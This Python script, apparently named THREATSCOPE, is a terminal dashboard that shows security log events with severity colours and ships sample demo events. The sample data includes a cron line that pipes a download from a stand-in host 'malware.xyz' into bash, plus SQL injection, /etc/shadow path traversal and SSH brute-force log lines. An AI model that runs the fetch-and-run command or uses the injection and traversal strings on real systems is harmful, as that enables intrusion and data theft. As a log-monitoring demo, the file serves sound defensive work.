import sys
import json
import time
import random
import threading
from datetime import datetime

try:
    from rich.console import Console
    from rich.table import Table
    from rich.live import Live
    from rich.text import Text
    from rich import box
except ImportError:
    print("Run: pip install rich")
    sys.exit(1)

console = Console()

EVENTS = []
MAX_ROWS = 40  # how many rows to show at once

SEV_COLORS = {
    "CRITICAL": "bold red",
    "HIGH":     "bold yellow",
    "MEDIUM":   "yellow",
    "LOW":      "cyan",
    "NONE":     "dim white",
}

DEMO_LINES = [
    '{"layer":"cpp","ts":1710028882,"type":"Failed Login","severity":"LOW","score":5,"ip":"192.168.1.105","line":"sshd: Failed password for root from 192.168.1.105"}',
    '{"layer":"cpp","ts":1710028884,"type":"Failed Login","severity":"LOW","score":10,"ip":"192.168.1.105","line":"sshd: Failed password for root from 192.168.1.105"}',
    '{"layer":"cpp","ts":1710028886,"type":"Failed Login","severity":"LOW","score":15,"ip":"192.168.1.105","line":"sshd: Failed password for root from 192.168.1.105"}',
    '{"layer":"cpp","ts":1710028888,"type":"Failed Login","severity":"LOW","score":20,"ip":"192.168.1.105","line":"sshd: Failed password for root from 192.168.1.105"}',
    '{"layer":"cpp","ts":1710028890,"type":"Brute Force","severity":"CRITICAL","score":50,"ip":"192.168.1.105","line":"sshd: THRESHOLD EXCEEDED — brute force confirmed"}',
    '{"layer":"cpp","ts":1710028896,"type":"Suspicious Auth","severity":"CRITICAL","score":55,"ip":"192.168.1.105","line":"sshd: Accepted password for backup from 192.168.1.105"}',
    '{"layer":"cpp","ts":1710029165,"type":"Path Traversal","severity":"HIGH","score":25,"ip":"203.0.113.77","line":"apache2: GET /../../../etc/shadow HTTP/1.1 403"}',
    '{"layer":"cpp","ts":1710029244,"type":"Port Scan","severity":"MEDIUM","score":10,"ip":"198.51.100.3","line":"UFW BLOCK SRC=198.51.100.3 DPT=3306"}',
    '{"layer":"cpp","ts":1710029300,"type":"Normal Traffic","severity":"NONE","score":0,"ip":"10.0.0.5","line":"apache2: GET /index.html HTTP/1.1 200"}',
    '{"layer":"cpp","ts":1710029461,"type":"Command Injection","severity":"CRITICAL","score":40,"ip":"","line":"cron: CMD (curl http://malware.xyz/payload.sh | bash)"}',
    '{"layer":"cpp","ts":1710029600,"type":"Normal Auth","severity":"NONE","score":0,"ip":"10.0.0.5","line":"sshd: Accepted publickey for sysadmin from 10.0.0.5"}',
    '{"layer":"cpp","ts":1710029722,"type":"SQL Injection","severity":"HIGH","score":25,"ip":"203.0.113.77","line":"apache2: GET /?q=1 UNION SELECT username,password FROM users"}',
    '{"layer":"cpp","ts":1710030001,"type":"Privilege Escalation","severity":"CRITICAL","score":60,"ip":"","line":"sudo: sysadmin COMMAND=/bin/bash"}',
    '{"layer":"cpp","ts":1710030100,"type":"Normal Traffic","severity":"NONE","score":0,"ip":"10.0.0.9","line":"nginx: GET /api/health HTTP/1.1 200"}',
    '{"layer":"cpp","ts":1710030200,"type":"Invalid User","severity":"LOW","score":8,"ip":"10.10.10.99","line":"sshd: Invalid user guest from 10.10.10.99"}',
]

def build_table():
    table = Table(
        box=box.SIMPLE_HEAD,
        show_header=True,
        header_style="bold green",
        expand=True,
        border_style="dim green",
    )

    table.add_column("#",     style="dim white",  width=5,  no_wrap=True)
    table.add_column("TIME",  style="dim white",  width=10, no_wrap=True)
    table.add_column("SEV",   width=10, no_wrap=True)
    table.add_column("TYPE",  width=22, no_wrap=True)
    table.add_column("IP",    style="yellow",     width=18, no_wrap=True)
    table.add_column("SCORE", width=7,  no_wrap=True)
    table.add_column("LINE",  no_wrap=True)

    visible = EVENTS[-MAX_ROWS:]

    for i, e in enumerate(visible):
        num    = str(len(EVENTS) - len(visible) + i + 1)
        ts     = datetime.fromtimestamp(e.get("ts", time.time())).strftime("%H:%M:%S")
        s      = e.get("severity", "NONE")
        color  = SEV_COLORS.get(s, "white")
        sev_t  = Text(s, style=color)
        type_t = Text(e.get("type", "—"), style=color)
        ip     = e.get("ip", "") or "—"
        score  = str(e.get("score", 0))
        line   = e.get("line", "")[:80]

        table.add_row(num, ts, sev_t, type_t, ip, score, line)

    return table

def read_stdin():
    for raw in sys.stdin:
        raw = raw.strip()
        if not raw:
            continue
        try:
            evt = json.loads(raw)
            EVENTS.append(evt)
        except json.JSONDecodeError:
            # Not JSON — wrap raw line so it still shows up
            EVENTS.append({
                "ts": time.time(),
                "type": "Raw Log",
                "severity": "NONE",
                "score": 0,
                "ip": "",
                "line": raw[:120],
            })

def run_demo():
    for line in DEMO_LINES:
        time.sleep(0.8)
        try:
            EVENTS.append(json.loads(line))
        except:
            pass
    while True:
        time.sleep(2)
        EVENTS.append(json.loads(random.choice(DEMO_LINES)))

def main():
    demo = "--demo" in sys.argv

    console.print(
        "\n[bold green]  THREATSCOPE[/] [dim]— Terminal Live View[/]\n"
        "  [dim]All events shown. Colors: [/]"
        "[bold red]CRITICAL[/] [bold yellow]HIGH[/] [yellow]MEDIUM[/] [cyan]LOW[/] [dim white]NONE[/]\n"
    )

    if demo:
        threading.Thread(target=run_demo, daemon=True).start()
    else:
        threading.Thread(target=read_stdin, daemon=True).start()

    with Live(build_table(), refresh_per_second=4, screen=False) as live:
        while True:
            live.update(build_table())
            time.sleep(0.25)

if __name__ == "__main__":
    main()